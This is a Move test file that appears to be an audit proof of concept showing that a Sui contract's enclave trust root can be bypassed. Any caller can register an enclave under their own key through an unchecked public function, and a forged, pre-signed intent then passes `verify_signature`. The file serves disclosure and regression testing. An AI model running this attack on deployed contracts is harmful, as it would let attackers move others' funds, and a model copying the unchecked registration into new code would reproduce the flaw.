// Copyright (c) Dugong
// SPDX-License-Identifier: Apache-2.0
//
// PoC for Finding 4953 (Critical) — Enclave trust-root fully bypassable.
//
// `enclave::register_enclave_unchecked<T>` is `public` and accepts an
// attacker-controlled `pk` with no Nitro attestation, no `Cap` check and no
// sender binding. It then `share_object`s an `Enclave<T>` whose `pk` is the
// attacker's. All value-moving entry functions in `dugong` (e.g.
// `transfers::transfer_coin`) authenticate only via `enclave::verify_signature`,
// which validates the signature against `enclave.pk`. An attacker can therefore
// self-register an `Enclave<DUGONG>`, sign any intent with their own private
// key, and pass `verify_signature` — bypassing the trust root entirely.

#[test_only]
module enclave::audit_poc_tests {
    use sui::test_scenario::{Self as ts};
    use std::string::{Self};
    use enclave::enclave::{
        Enclave, EnclaveConfig, new_cap, create_enclave_config,
        register_enclave_unchecked, verify_signature, pk,
    };

    // Witness used to parameterize the enclave type for the test. Any drop
    // witness works — it stands in for `dugong::dug::DUGONG` here.
    public struct WITNESS has drop {}

    fun attacker(): address { @0xBAD }
    fun deployer(): address { @0xCAFE }

    // Hard-coded attacker keypair material generated off-chain (PyNaCl, Ed25519).
    // The corresponding IntentMessage<vector<u8>> byte payload is:
    //   intent(2) || timestamp(1700000000000 LE) || uleb128(10) || b"victim-xid"
    // = 0x020068e5cf8b0100000a76696374696d2d786964
    fun attacker_pk(): vector<u8> {
        x"8a88e3dd7409f195fd52db2d3cba5d72ca6709bf1d94121bf3748801b40f6f5c"
    }
    fun attacker_sig(): vector<u8> {
        x"63b4ad865862d223052ecd65973e6b123ba1297f83fc708772facbded96970f419a652698cbf18a78ef6ed51e988398702b939f9e44d4c5d8d446d088d225801"
    }
    fun signed_intent(): u8 { 2 }
    fun signed_timestamp(): u64 { 1700000000000 }
    fun signed_payload(): vector<u8> { b"victim-xid" }

    // ====== PoC: any caller self-registers an Enclave with attacker pk ======

    #[test]
    fun test_poc_4953_self_register_enclave_with_attacker_pk() {
        // A legitimate deployer first publishes the EnclaveConfig + Cap. This
        // models the project's own `init` flow — the canonical config exists,
        // but nothing prevents someone else from minting a competing Enclave.
        let mut scenario = ts::begin(deployer());
        ts::next_tx(&mut scenario, deployer());
        {
            let _cap = new_cap<WITNESS>(WITNESS {}, ts::ctx(&mut scenario));
            create_enclave_config<WITNESS>(
                &_cap,
                string::utf8(b"legit"),
                x"00", x"00", x"00",
                ts::ctx(&mut scenario),
            );
            // Hold the Cap so it stays alive across the scenario.
            sui::transfer::public_transfer(_cap, deployer());
        };

        // Distinct attacker address self-registers an Enclave<WITNESS> using
        // register_enclave_unchecked, supplying THEIR OWN pk. No Nitro doc, no
        // Cap, no sender check — the call succeeds and shares a brand-new
        // Enclave whose pk is the attacker's.
        ts::next_tx(&mut scenario, attacker());
        {
            let config = ts::take_shared<EnclaveConfig<WITNESS>>(&scenario);
            register_enclave_unchecked<WITNESS>(
                &config,
                attacker_pk(),
                ts::ctx(&mut scenario),
            );
            ts::return_shared(config);
        };

        // The attacker-owned shared Enclave now exists and its pk is exactly
        // the attacker's pk — proving the trust-root is fully bypassable.
        ts::next_tx(&mut scenario, attacker());
        {
            let enclave = ts::take_shared<Enclave<WITNESS>>(&scenario);
            assert!(*pk(&enclave) == attacker_pk(), 0xDEAD);
            ts::return_shared(enclave);
        };

        ts::end(scenario);
    }

    // ====== PoC: verify_signature returns true against the fake Enclave ======

    #[test]
    fun test_poc_4953_attacker_signature_passes_verify() {
        let mut scenario = ts::begin(attacker());
        ts::next_tx(&mut scenario, attacker());
        {
            let cap = new_cap<WITNESS>(WITNESS {}, ts::ctx(&mut scenario));
            create_enclave_config<WITNESS>(
                &cap,
                string::utf8(b"x"),
                x"00", x"00", x"00",
                ts::ctx(&mut scenario),
            );
            sui::transfer::public_transfer(cap, attacker());
        };

        // Attacker self-registers an Enclave<WITNESS> with their own pk.
        ts::next_tx(&mut scenario, attacker());
        {
            let config = ts::take_shared<EnclaveConfig<WITNESS>>(&scenario);
            register_enclave_unchecked<WITNESS>(
                &config,
                attacker_pk(),
                ts::ctx(&mut scenario),
            );
            ts::return_shared(config);
        };

        // The attacker signs the IntentMessage off-chain with their private key
        // and submits it together with the self-registered Enclave to any
        // entry function that authenticates via `verify_signature`. Move's
        // native ed25519_verify validates against `enclave.pk` (the attacker's
        // pk), so the forged intent is accepted.
        ts::next_tx(&mut scenario, attacker());
        {
            let enclave = ts::take_shared<Enclave<WITNESS>>(&scenario);
            let ok = verify_signature<WITNESS, vector<u8>>(
                &enclave,
                signed_intent(),
                signed_timestamp(),
                signed_payload(),
                &attacker_sig(),
            );
            assert!(ok, 0xBAD);
            ts::return_shared(enclave);
        };

        ts::end(scenario);
    }

    // ====== Sanity: an unrelated signature must still fail ======
    // (demonstrates verify_signature is actually doing real crypto and we are
    // not passing by accident)

    #[test]
    fun test_poc_4953_random_signature_rejected() {
        let mut scenario = ts::begin(attacker());
        ts::next_tx(&mut scenario, attacker());
        {
            let cap = new_cap<WITNESS>(WITNESS {}, ts::ctx(&mut scenario));
            create_enclave_config<WITNESS>(
                &cap,
                string::utf8(b"x"),
                x"00", x"00", x"00",
                ts::ctx(&mut scenario),
            );
            sui::transfer::public_transfer(cap, attacker());
        };

        ts::next_tx(&mut scenario, attacker());
        {
            let config = ts::take_shared<EnclaveConfig<WITNESS>>(&scenario);
            register_enclave_unchecked<WITNESS>(
                &config,
                attacker_pk(),
                ts::ctx(&mut scenario),
            );
            ts::return_shared(config);
        };

        ts::next_tx(&mut scenario, attacker());
        {
            let enclave = ts::take_shared<Enclave<WITNESS>>(&scenario);
            let bogus = x"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            let ok = verify_signature<WITNESS, vector<u8>>(
                &enclave,
                signed_intent(),
                signed_timestamp(),
                signed_payload(),
                &bogus,
            );
            assert!(!ok, 0xBAD);
            ts::return_shared(enclave);
        };

        ts::end(scenario);
    }
}
